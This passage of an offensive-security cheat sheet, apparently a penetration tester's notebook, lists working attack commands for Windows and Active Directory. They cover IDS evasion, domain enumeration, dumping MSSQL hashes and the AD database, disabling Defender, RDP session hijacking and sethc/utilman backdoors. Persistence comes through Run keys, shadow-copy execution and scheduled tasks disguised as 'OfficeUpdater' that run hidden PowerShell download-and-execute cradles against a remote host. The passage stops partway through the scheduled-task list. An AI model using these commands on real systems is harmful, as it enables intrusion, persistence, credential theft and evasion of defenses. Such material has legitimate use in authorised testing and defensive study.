<h4 id="ids-evasion">IDS Evasion<a class="headerlink" href="#ids-evasion" title="Permanent link">&para;</a></h4>
<p>Append extra random data to change default packet lengths</p>
<div class="highlight"><pre><span></span><code>    –data-length 15
</code></pre></div>
<p>Randomize scan order</p>
<div class="highlight"><pre><span></span><code>    -randomize-hosts
</code></pre></div>
<h3 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h3>
<h4 id="eyewitness">Eyewitness<a class="headerlink" href="#eyewitness" title="Permanent link">&para;</a></h4>
<p>Get the most recent version</p>
<div class="highlight"><pre><span></span><code>    git clone https://github.com/ChrisTruncer/EyeWitness.git
</code></pre></div>
<p>Faster Scan</p>
<div class="highlight"><pre><span></span><code>    ./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
</code></pre></div>
<p>Slow version via proxychains</p>
<div class="highlight"><pre><span></span><code>    proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https

    proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
</code></pre></div>
<p>Proxychains specify a remote DNS server</p>
<p><a href="http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html">http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html</a></p>
<div class="highlight"><pre><span></span><code>    On Kali linux its found here: /usr/lib/proxychains3/proxyresolv

        #!/bin/sh
        # This script is called by proxychains to resolve DNS names
        # DNS server used to resolve names
        DNS_SERVER=4.2.2.2

        if [ $# = 0 ] ; then
         echo &quot; usage:&quot;
         echo &quot;  proxyresolv &lt;hostname&gt; &quot;
         exit
        fi

        export LD_PRELOAD=libproxychains.so.3
        dig $1 @$DNS_SERVER +tcp | awk &#39;/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}&#39;
</code></pre></div>
<p><em>Use Canary tokens to identify web front-end vulnerabilities</em></p>
<p>In combination with Burp collaborator, identify configuration issues with web front-end appliances</p>
<p>For example, issue request to target domain with a custom Host header pointing to your collaborator/canary:</p>
<p>Request:</p>
<div class="highlight"><pre><span></span><code>    GET / HTTP/1.1
    Host: uniqid.burpcollaborator.net
    Connection: close
</code></pre></div>
<p>Response (on Collaborator):</p>
<div class="highlight"><pre><span></span><code>    GET / HTTP/1.1
    Host: XX.X.XXX.XX:8082


    HTTP/1.1 200 Connection Established
    Date: Tue, 07 Feb 2017 16:32:50 GMT
    Transfer-Encoding: chunked
    Connection: close

    Ok
    / HTTP/1.1 is unavailable
    Ok
    Unknown Command
    Ok
    Unknown Command
    Ok
    Unknown Command
    Ok
</code></pre></div>
<p><a href="https://canarytokens.org/generate#">Canarytokens.org</a>
<a href="http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html">Blog - Targeting HTTP's Hidden Attack Surface</a></p>
<hr />
<h2 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h2>
<h3 id="built-in-commands">Built-in Commands<a class="headerlink" href="#built-in-commands" title="Permanent link">&para;</a></h3>
<p>View your current user:</p>
<div class="highlight"><pre><span></span><code>    whoami
</code></pre></div>
<p>View information about the current user:</p>
<div class="highlight"><pre><span></span><code>    net user myuser(for a local user)
    net user myuser /domain (for a domain user)
</code></pre></div>
<p>View the local groups:</p>
<div class="highlight"><pre><span></span><code>    net localgroup
</code></pre></div>
<p>View the local administrators:</p>
<div class="highlight"><pre><span></span><code>    net localgroup Administrators
</code></pre></div>
<p>Add a new user:</p>
<div class="highlight"><pre><span></span><code>    net user myuser mypass /add
</code></pre></div>
<p>Add a user in the local Administrators group:</p>
<div class="highlight"><pre><span></span><code>    net localgroup Administrators myuser /add
</code></pre></div>
<p>View the domain name of current machine:</p>
<div class="highlight"><pre><span></span><code>    net config workstation
    net config server
</code></pre></div>
<p>View the name of the domain controller:</p>
<div class="highlight"><pre><span></span><code>    reg query &quot;HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\ CurrentVersion\Group Policy\ History&quot; /v DCName
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    set l
</code></pre></div>
<p>Get list of DCs</p>
<div class="highlight"><pre><span></span><code>    nltest /dclist:domainname
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    netdom query /D:domin DC
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    dsquery server
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com
</code></pre></div>
<p>Get DC Info</p>
<div class="highlight"><pre><span></span><code>    nltest /dsgetdc:domain
</code></pre></div>
<p>Get DC site mapping</p>
<div class="highlight"><pre><span></span><code>    nltest /dsaddresstosite:dcname.corp.test.com
</code></pre></div>
<p>Get PDC</p>
<div class="highlight"><pre><span></span><code>    netdom query /D:domain PDC
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com
</code></pre></div>
<p>or get roles</p>
<p>Get Roles</p>
<div class="highlight"><pre><span></span><code>    netdom query /D:domain FSMO
</code></pre></div>
<p>List trusts</p>
<div class="highlight"><pre><span></span><code>nltest /domain_trust
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>nltest /trusted_domains
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>get-adtrust -Filter *
</code></pre></div>
<p>Get DC for Trusted Domains</p>
<div class="highlight"><pre><span></span><code>$t=Get-AdTrust -Filter * |Select -expandproperty Name;foreach($line in $t){nltest /dclist:$line}
</code></pre></div>
<p>View the list of domain users:</p>
<div class="highlight"><pre><span></span><code>    C:\&gt; wmic useraccount where (domain=&#39;%USERDOMAIN%&#39;) get Name &gt; userlist.txt

    PS C:\&gt; ([adsisearcher]&quot;objectCategory=User&quot;).Findall() | ForEach
    {$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    net user /domain
</code></pre></div>
<p>Get domain info (including DC)</p>
<div class="highlight"><pre><span></span><code>    gpresult /z
</code></pre></div>
<p>View the list of domain admins:</p>
<div class="highlight"><pre><span></span><code>    net group &quot;Domain Admins&quot; /domain
</code></pre></div>
<p>View domain groups</p>
<div class="highlight"><pre><span></span><code>    net group /domain
    powershell (new-object system.directoryservices.directorysearcher(&quot;(&amp;(objectcategory=user)(samaccountname=$($env:username)))&quot;)).FindOne().GetDirectoryEntry().memberof
</code></pre></div>
<p>View the list of started services (search for antivirus):</p>
<div class="highlight"><pre><span></span><code>    net start
    sc query
</code></pre></div>
<p>Stop a service:</p>
<div class="highlight"><pre><span></span><code>    net stop &quot;Symantec Endpoint Protection&quot;
</code></pre></div>
<p>View the list of started processes and the owner:</p>
<div class="highlight"><pre><span></span><code>    tasklist /v
</code></pre></div>
<p>Kill a process by its name:</p>
<div class="highlight"><pre><span></span><code>    taskkill /F /IM &quot;cmd.exe&quot;
</code></pre></div>
<p>Abort a shutdown/restart countdown:</p>
<div class="highlight"><pre><span></span><code>    shutdown /a
</code></pre></div>
<p>Download an executable from a remote FTP server:</p>
<div class="highlight"><pre><span></span><code>    echo open 10.1.2.3&gt; C:\script.txt
    echo user myftpuser&gt;&gt; C:\script.txt
    echo pass myftppass&gt;&gt; C:\script.txt
    echo get nc.exe&gt;&gt; C:\script.txt
    echo bye&gt;&gt; C:\script.txt
    ftp -s:script.txt
</code></pre></div>
<p>Upload a file to a remote FTP server:</p>
<div class="highlight"><pre><span></span><code>    echo open 10.1.2.3&gt; C:\script.txt
    echo user myftpuser&gt;&gt; C:\script.txt
    echo pass myftppass&gt;&gt; C:\script.txt
    echo put E:\backups\database.dbf&gt;&gt; C:\script.txt
    echo bye&gt;&gt; C:\script.txt
    ftp -s:script.txt
</code></pre></div>
<p>WMI call remote system</p>
<div class="highlight"><pre><span></span><code>    wmic /node:remote_computer process call create &quot;netstat.exe -ano &gt; C:\output.txt&quot;
</code></pre></div>
<p>WMI get startup items</p>
<div class="highlight"><pre><span></span><code>    wmic startup get Caption, Command, User
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    wmic startup list full
</code></pre></div>
<p>WMI get enabled account password expiration</p>
<div class="highlight"><pre><span></span><code>    wmic useraccount where &quot;disabled=0 AND localaccount=1&quot; get name, passwordexpires /value
</code></pre></div>
<p>View established connections of current machine:</p>
<div class="highlight"><pre><span></span><code>    netstat -a -n -p tcp | find &quot;ESTAB&quot;
</code></pre></div>
<p>View open ports of current machine:</p>
<div class="highlight"><pre><span></span><code>    netstat -a -n -p tcp | find &quot;LISTEN&quot;
</code></pre></div>
<div class="highlight"><pre><span></span><code>    netstat -a -n -p udp
</code></pre></div>
<p>View network configuration:</p>
<div class="highlight"><pre><span></span><code>    netsh interface ip show addresses
    netsh interface ip show route
    netsh interface ip show neighbors
</code></pre></div>
<p>View current network shares:</p>
<div class="highlight"><pre><span></span><code>    net share
</code></pre></div>
<p>Mount a remote share with the rights of the current user:</p>
<div class="highlight"><pre><span></span><code>    net use K: \\10.1.2.3\C$
</code></pre></div>
<p>Enable Remote Desktop:</p>
<div class="highlight"><pre><span></span><code>    reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
</code></pre></div>
<p>One-Liner Windows Enumeration
Reference: <a href="https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7">https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7</a></p>
<div class="highlight"><pre><span></span><code>    whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group &quot;domain admins&quot; /domain 2&gt;&amp;1 &amp; net group &quot;Exchange Trusted Subsystem&quot; /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; 2&gt;&amp;1 &amp; net view &amp; net view /domain &amp; net user %USERNAME% /domain &amp; nltest /dclist &amp; gpresult /z
</code></pre></div>
<p>Check for unquoted service paths</p>
<div class="highlight"><pre><span></span><code>    wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;.&quot;) +4)) -match &quot;.* .*&quot;}
</code></pre></div>
<p>Change Windows Proxy Settings</p>
<div class="highlight"><pre><span></span><code>    Command to enable proxy usage:

    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d 1 /f

    Command to disable proxy usage:

    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d 0 /f

    Command to change the proxy address:

    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f

    Also, in this case, it is a per-user setting than a system-wide setting.
</code></pre></div>
<p>Mount a .win image remotely on target machine</p>
<div class="highlight"><pre><span></span><code>    Dism /get-wiminfo /wimfile:z:\win7\Acme_Win7.wim


    Boot Dir
    Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:1 /MountDir:C:\windows\temp\offline

    C: Drive
    Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:2 /MountDir:C:\windows\temp\offline

    Dism /UnMount-Wim /MountDir:C:\windows\temp\offline /discard
</code></pre></div>
<p>For loop example</p>
<div class="highlight"><pre><span></span><code>    for /D %f in (&quot;C:\Users\username\*&quot;) do dir %f
</code></pre></div>
<p>For loop, count lines</p>
<div class="highlight"><pre><span></span><code>    for /R &quot;C:\users\username\desktop&quot; %f in (*) do find /c /v &quot;&quot; %f
</code></pre></div>
<p>Check if file is locked</p>
<div class="highlight"><pre><span></span><code>    @echo off; 2&gt;nul ( &gt;&gt;file.txt echo off) &amp;&amp; (echo not locked) || (echo locked)
</code></pre></div>
<p>Lock a file for testing</p>
<div class="highlight"><pre><span></span><code>    (&gt;&amp;2 pause) &gt;&gt; file.txt
</code></pre></div>
<h4 id="dsquery">DSQUERY<a class="headerlink" href="#dsquery" title="Permanent link">&para;</a></h4>
<p>Get attributes for all Windows hosts in the Domain</p>
<div class="highlight"><pre><span></span><code>dsquery * -filter &quot;(&amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))&quot; -limit 0 |dsget computer -dn -samid -desc -loc &gt;c:\windows\temp\computers.log
</code></pre></div>
<p>Get attributes for computers in a specific OU</p>
<div class="highlight"><pre><span></span><code>dsquery computer &lt;OU=PUT OU HERE&gt; -limit 0 |dsget computer -dn -samid -desc -l &gt;c:\windows\temp\out.log
</code></pre></div>
<p>Get attributes for users in the specified OU</p>
<div class="highlight"><pre><span></span><code>    dsquery user &lt;OU=PUT OU HERE&gt; -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled
</code></pre></div>
<p>Get DC</p>
<div class="highlight"><pre><span></span><code>    dsquery server -forest
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code>    dsquery server -o rdn -forest
</code></pre></div>
<p>Get Domain Functional Level</p>
<div class="highlight"><pre><span></span><code>    dsquery * &quot;DC=corp,DC=test,DC=com&quot; -scope base -attr msDS-Behavior-Version ntMixedDomain
</code></pre></div>
<p>Get Forest Functional Level</p>
<div class="highlight"><pre><span></span><code>    dsquery * &quot;CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com&quot; -scope base -attr msDS-Behavior-Version ntMixedDomain
</code></pre></div>
<h4 id="sqlcmd">SQLCMD<a class="headerlink" href="#sqlcmd" title="Permanent link">&para;</a></h4>
<p>List Databases</p>
<div class="highlight"><pre><span></span><code>    sqlcmd -E -S localhost -Q &quot;EXEC sp_databases;&quot;
</code></pre></div>
<p>List Tables in Database</p>
<div class="highlight"><pre><span></span><code>    sqlcmd -E -S localhost -Q &quot;SELECT * FROM DatabaseName.information_schema.tables;&quot; -W -w 999 -s&quot;,&quot; -o &quot;c:\windows\temp\RecruiterProd_MSCRM_tables.csv&quot;
</code></pre></div>
<p>Retrieve table contents</p>
<div class="highlight"><pre><span></span><code>    sqlcmd -E -S localhost -d DatabaseName -Q &quot;SELECT * FROM SystemUserBase;&quot; -W -w 999 -s&quot;,&quot; -o &quot;c:\windows\temp\RecruiterProd_MSCRM_userbase.csv&quot;
</code></pre></div>
<p>Dump MSSQL Password Hashes</p>
<div class="highlight"><pre><span></span><code>    sqlcmd -E -S localhost -Q &quot;SELECT name, password_hash FROM master.sys.sql_logins;&quot;
</code></pre></div>
<h4 id="ntdsutil">NTDSUTIL<a class="headerlink" href="#ntdsutil" title="Permanent link">&para;</a></h4>
<p>Built-in utility to create backup copy of the AD database</p>
<div class="highlight"><pre><span></span><code>    ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q
</code></pre></div>
<h4 id="applocker">Applocker<a class="headerlink" href="#applocker" title="Permanent link">&para;</a></h4>
<p>List Applocker's effective policy on the system</p>
<div class="highlight"><pre><span></span><code>    Get-ApplockerPolicy -Effective
</code></pre></div>
<h4 id="windows-defender">Windows Defender<a class="headerlink" href="#windows-defender" title="Permanent link">&para;</a></h4>
<p>Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)</p>
<div class="highlight"><pre><span></span><code>    c:\program files\windows defender\mpcmdrun.exe&quot; -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
</code></pre></div>
<h4 id="appcmd">APPCMD<a class="headerlink" href="#appcmd" title="Permanent link">&para;</a></h4>
<p>Get virtual directories in IIS</p>
<div class="highlight"><pre><span></span><code>    c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath
</code></pre></div>
<h3 id="windows-lateral-movement">Windows Lateral Movement<a class="headerlink" href="#windows-lateral-movement" title="Permanent link">&para;</a></h3>
<p>RDP Hijacking</p>
<p>If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.</p>
<p>Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.</p>
<p><a href="https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6">RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation</a></p>
<div class="highlight"><pre><span></span><code>    # View RDP sessions on system your RDP&#39;d to with administrative permissions
    # Locally
    quser

    # Remote
    quser /server:&lt;servername&gt;

    # Create a service that will swap your SESSIONNAME with the desired disconnected session
    sc create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#XX&quot; error= &quot;ignore&quot;

    # Start service
    net start sesshijack
    or
    sc start sesshijack
</code></pre></div>
<p>Linux to Windows Remoting</p>
<ul>
<li>In windows run</li>
</ul>
<div class="highlight"><pre><span></span><code>    winrm set winrm/config/Service/Auth @{Basic=&quot;true&quot;}
    winrm set winrm/config/Service @{AllowUnencrypted=&quot;true&quot;}
</code></pre></div>
<ul>
<li>In linux run</li>
</ul>
<div class="highlight"><pre><span></span><code>    $cred = Get-Credential
    Enter-PSSession -ComputerName &#39;winserver1&#39; -Credential $cred -Authentication Basic
</code></pre></div>
<p>PowerShell Remoting over SSH</p>
<div class="highlight"><pre><span></span><code>    Enter-PSSession -Hostname &lt;IP or FQDN&gt; -Username james -SSHTransport
</code></pre></div>
<h2 id="windows-persistence-methods">Windows Persistence Methods<a class="headerlink" href="#windows-persistence-methods" title="Permanent link">&para;</a></h2>
<h3 id="registry-keys">Registry Keys<a class="headerlink" href="#registry-keys" title="Permanent link">&para;</a></h3>
<h4 id="modify-registry-keys">Modify registry keys<a class="headerlink" href="#modify-registry-keys" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    #Add a key/value
    reg add \\&lt;systemname&gt;\&lt;KEY&gt; /v &quot;&lt;value&gt;&quot;&quot; /t &lt;type (Binary,REG_SZ,etc)&gt; /d &lt;data&gt;

    #Delete a key/value
    reg delete \\&lt;systemname&gt;\&lt;KEY&gt; /v &quot;&lt;value&gt;&quot;
</code></pre></div>
<h5 id="userinit-key">Userinit Key<a class="headerlink" href="#userinit-key" title="Permanent link">&para;</a></h5>
<p>This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.</p>
<div class="highlight"><pre><span></span><code>    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
    HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
</code></pre></div>
<h5 id="run-key">Run Key<a class="headerlink" href="#run-key" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    #System Wide
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

    #Current Logged-On User Only
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre></div>
<h5 id="list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run">List Image File Execution Options (Debugger file executed when the target file is run)<a class="headerlink" href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    HKLM\Software\MS\WindowsNT\CurrentVersion\Image File Execution Options\notepad.exe\debugger(REG_SZ = cmd.exe)
</code></pre></div>
<h5 id="appinit_dlls">AppInit_DLLs<a class="headerlink" href="#appinit_dlls" title="Permanent link">&para;</a></h5>
<p>Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV!</p>
<p>This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.</p>
<div class="highlight"><pre><span></span><code>    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows\AppInit_DLLs
</code></pre></div>
<h5 id="no-reboot-sethcutilman-option-using-a-debugger-key">No-reboot sethc/utilman option using a "debugger" key<a class="headerlink" href="#no-reboot-sethcutilman-option-using-a-debugger-key" title="Permanent link">&para;</a></h5>
<p>Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
Make key called "sethc.exe"
Make a REG_SQ value called "Debugger"
Assign it "c:\windows\system32\cmd.exe" as the value
Hit SHIFT 5 times and get a shell as nt authority\system</p>
<div class="highlight"><pre><span></span><code>    reg add &quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot;
    reg add &quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /v Debugger /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot;
</code></pre></div>
<p>Remove the debugger key</p>
<div class="highlight"><pre><span></span><code>    reg delete &quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f
    reg delete &quot;\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /f
</code></pre></div>
<h4 id="file-storage-locations">File Storage Locations<a class="headerlink" href="#file-storage-locations" title="Permanent link">&para;</a></h4>
<h5 id="startup-folders">Startup Folders<a class="headerlink" href="#startup-folders" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    #All Users - Windows XP
    C:\Documents and Settings\All Users\Start Menu\Programs\Startup

    #All Users - Windows Vista+
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

    #User Profile - Windows XP
    C:\Documents and Settings\&lt;USERNAME&gt;\Start Menu\Programs\Startup

    #User Profile - Windows Vista+
    C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
</code></pre></div>
<h5 id="sethcutilman-replacement">SETHC/UTILMAN Replacement<a class="headerlink" href="#sethcutilman-replacement" title="Permanent link">&para;</a></h5>
<p>Replace these binaries, may require a reboot to take effect</p>
<div class="highlight"><pre><span></span><code>    %WINDIR%\System32\sethc.exe
    %WINDIR%\System32\utilman.exe
</code></pre></div>
<p>Hit shift 5 times = sethc.exe run by SYSTEM
Windows key + U = utilman.exe run by SYSTEM</p>
<h5 id="volume-shadow-copy-restore-points">Volume Shadow Copy (Restore Points)<a class="headerlink" href="#volume-shadow-copy-restore-points" title="Permanent link">&para;</a></h5>
<p>Windows service that's constantly running - takes snapshots of system directories</p>
<p>Drop Malware -&gt; Create VSC (ReadOnly) -&gt; Delete Malware -&gt; Use WMIC to run VSC of malware</p>
<p>Registry Key to Disable Volume Shadow Copy</p>
<div class="highlight"><pre><span></span><code>    HKLM\System\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot
</code></pre></div>
<h5 id="vssadmin-native-windows-utility">VSSADMIN - native windows utility<a class="headerlink" href="#vssadmin-native-windows-utility" title="Permanent link">&para;</a></h5>
<p>vssadmin create command only applies to Server OS (Win2k3,2008)</p>
<div class="highlight"><pre><span></span><code>    vssadmin list shadows
    vssadmin create shadow /for=C:
    wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin create shadow /for=C
    mklink /D C:\VscAccess \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1
    copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files
</code></pre></div>
<h5 id="use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy">Use WMIC process call to run an .exe from a Volume Shadow Copy<a class="headerlink" href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe
</code></pre></div>
<p>This process will not show the imagename (executable filename) or commandline parameters in the task list.
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.</p>
<div class="highlight"><pre><span></span><code>    root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe
    NTSTATUS: NT_STATUS_OK - Success
</code></pre></div>
<p>In Kali Linux you could use the WMIS package to do the same thing:</p>
<div class="highlight"><pre><span></span><code>    wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe
    NTSTATUS: NT_STATUS_OK - Success
</code></pre></div>
<h4 id="task-scheduling">Task Scheduling<a class="headerlink" href="#task-scheduling" title="Permanent link">&para;</a></h4>
<h5 id="at">AT<a class="headerlink" href="#at" title="Permanent link">&para;</a></h5>
<p>Executes as system and must be an Admin to run it. Check groups with whoami /groups</p>
<div class="highlight"><pre><span></span><code>    at 13:20 /interactive cmd

    net user \\target /user:Domain\user pass
    net time \\target
    at \\target 13:20 c:\temp\evil.bat
</code></pre></div>
<h5 id="schtasks">SCHTASKS<a class="headerlink" href="#schtasks" title="Permanent link">&para;</a></h5>
<p>Any user can create a task</p>
<p>Schedule a binary to run with arguments on system events</p>
<div class="highlight"><pre><span></span><code>    #On System Startup
    schtasks /create /TN OfficeUpdaterA /tr &quot;&quot;c:\evil32.exe&quot; -k password -n services&quot; /SC onstart /RU system /RL HIGHEST
    schtasks /create /TN OfficeUpdaterD /tr &quot;\&quot;c:\Program Files\evil32.exe\&quot; -k password -n services&quot; /SC onstart /RU system /RL HIGHEST

    #On User Login
    schtasks /create /TN OfficeUpdaterB /tr &quot;&quot;c:\evil32.exe&quot; -k password -n services&quot; /SC onlogon
    schtasks /create /TN OfficeUpdaterE /tr &quot;\&quot;c:\Program Files\evil32.exe\&quot; -k password -n services&quot; /SC onlogon

    #On Idle
    schtasks /create /TN OfficeUpdaterC /tr &quot;&quot;c:\evil32.exe&quot; -k password -n services&quot; /SC onidle /i 30&#39;&#39;&#39;&#39;
    schtasks /create /TN OfficeUpdaterF /tr &quot;\&quot;c:\Program Files\evil32.exe\&quot; -k password -n services&quot; /SC onidle /i 60
</code></pre></div>
<p>Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\windows\misc\psh_web_delivery'</p>
<div class="highlight"><pre><span></span><code>    #(X86) - On User Login
    schtasks /create /tn OfficeUpdaterA /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot; /sc onlogon /ru System

    #(X86) - On System Start
    schtasks /create /tn OfficeUpdaterB /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot; /sc onstart /ru System

    #(X86) - On User Idle (30mins)
    schtasks /create /tn OfficeUpdaterC /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot; /sc onidle /i 30

    #(X64) - On User Login
